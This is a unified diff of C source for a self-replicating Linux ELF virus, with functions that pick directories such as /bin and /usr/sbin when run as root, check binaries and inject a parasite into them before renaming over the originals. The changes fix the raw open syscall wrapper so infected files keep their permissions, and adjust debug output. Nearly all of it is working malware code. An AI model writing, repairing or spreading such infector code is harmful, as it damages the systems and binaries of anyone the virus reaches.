@@ -16,6 +16,14 @@
 #include <sys/user.h>
 #include <sys/prctl.h>
 
+struct linux_dirent64 {
+        uint64_t             d_ino;
+        int64_t             d_off;
+        unsigned short  d_reclen;
+        unsigned char   d_type;
+        char            d_name[0];
+} __attribute__((packed));
+
 
 /* libc */ 
 
@@ -37,10 +45,11 @@ int _fstat(long, void *);
 long _lseek(long, long, unsigned int);
 void Exit(long);
 void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
-long _open(const char *, unsigned long);
+long _open(const char *, unsigned long, long);
 long _write(long, char *, unsigned long);
 int _read(long, char *, unsigned long);
-
+int _getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                    unsigned int count);
 unsigned long get_rip(void);
 void end_code(void);
 void dummy_marker(void);
@@ -72,14 +81,6 @@ struct bootstrap_data {
 	int argc;
 	char **argv;
 };
-
-struct linux_dirent64 {
-        uint64_t             d_ino;
-        int64_t             d_off;
-        unsigned short  d_reclen;
-        unsigned char   d_type;
-        char            d_name[0];
-} __attribute__((packed));
 
 typedef struct elfbin {
 	Elf64_Ehdr *ehdr;
@@ -239,14 +240,13 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          */ 
         extern int return_entry_start;
 
-        if ((ofd = _open(TMP, O_CREAT | O_WRONLY | O_TRUNC/*, st.st_mode*/)) == -1) 
+        if ((ofd = _open(TMP, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode)) == -1) 
                 return -1;
         
         /*
          * Write first 64 bytes of original binary (The elf file header) 
          * [ehdr] 
          */
-	DEBUG_PRINT("Writing ehdr\n");
         if ((c = _write(ofd, mem, ehdr_size)) != ehdr_size) 
 		return -1;
         
@@ -254,7 +254,6 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * Now inject the virus
          * [ehdr][virus]
          */
-	DEBUG_PRINT("Writing parasite\n");
 	for (i = 0; i < 32; i++)
 		_printf("%x ", self->mem[i] & 0xff);
         if ((c = _write(ofd, parasite, self->size)) != self->size) {
@@ -282,7 +281,9 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 		return -1;
         
 		
-        _rename(TMP, target->path);
+	_printf("Renaming %s to %s\n", TMP, target->path);
+        if (_rename(TMP, target->path) < 0)
+		DEBUG_PRINT("rename failed\n");
         
 	_close(ofd);
 
@@ -373,6 +374,9 @@ int load_self(elfbin_t *elf)
 	elf->mem = (uint8_t *)_start_addr;
 	elf->size = (char *)&end_code - (char *)&_start; 
 	elf->size += (int)((char *)f2 - (char *)f1);
+#if DEBUG // this makes it possible for _printf's to work since we inject .rodata
+	elf->size += 1000;
+#endif
 	return 0;
 }
 
@@ -380,7 +384,8 @@ int load_target(const char *path, elfbin_t *elf)
 {
 	int i;
 	struct stat st;
-	int fd = _open(path, O_RDONLY);
+	elf->path = path;
+	int fd = _open(path, O_RDONLY, 0);
 	if (fd < 0)
 		return -1;
 	if (_fstat(fd, &st) < 0)
@@ -424,7 +429,7 @@ int check_criteria(char *filename)
 	uint8_t mem[4096];
 	uint32_t magic;
 	
-	fd = _open(filename, O_RDONLY);
+	fd = _open(filename, O_RDONLY, 0);
 	if (fd < 0) 
 		return -1;
 	if (_read(fd, mem, 4096) < 0)
@@ -471,12 +476,12 @@ void do_main(struct bootstrap_data *bootstrap)
 			{'/','u','s','r','/','s','b','i','n','\0'},        
 			{'/','b','i','n','\0'}
 			};
-
-	dir = _getuid() != 0 ? "." : randomly_select_dir((char **)dirs);
+	char cwd[2] = {'.', '\0'};
+	dir = _getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
 	
 	DEBUG_PRINT("Infecting files in directory: %s\n", dir);
 	
-	dd = _open(dir, O_RDONLY | O_DIRECTORY);
+	dd = _open(dir, O_RDONLY | O_DIRECTORY, 0);
 	if (dd < 0) {
 		DEBUG_PRINT("open failed\n");
 		return;
@@ -505,7 +510,7 @@ void do_main(struct bootstrap_data *bootstrap)
 				continue;
 			if (check_criteria(full_path(d->d_name, dir)) < 0)
 				continue;
-			DEBUG_PRINT("infecting file: %s\n", d->d_name);
+			//DEBUG_PRINT("infecting file: %s\n", d->d_name);
 			
 			load_target(d->d_name, &target);
 			infect_elf_file(&self, &target);
@@ -529,14 +534,16 @@ void Exit(long status)
                          "mov $60, %%rax\n"
                          "syscall" : : "r"(status));
 }
-long _open(const char *path, unsigned long flags)
+
+long _open(const char *path, unsigned long flags, long mode)
 {
         long ret;
         __asm__ volatile(
                         "mov %0, %%rdi\n"
                         "mov %1, %%rsi\n"
+			"mov %2, %%rdx\n"
                         "mov $2, %%rax\n"
-                        "syscall" : : "g"(path), "g"(flags));
+                        "syscall" : : "g"(path), "g"(flags), "g"(mode));
         asm ("mov %%rax, %0" : "=r"(ret));              
         
         return ret;
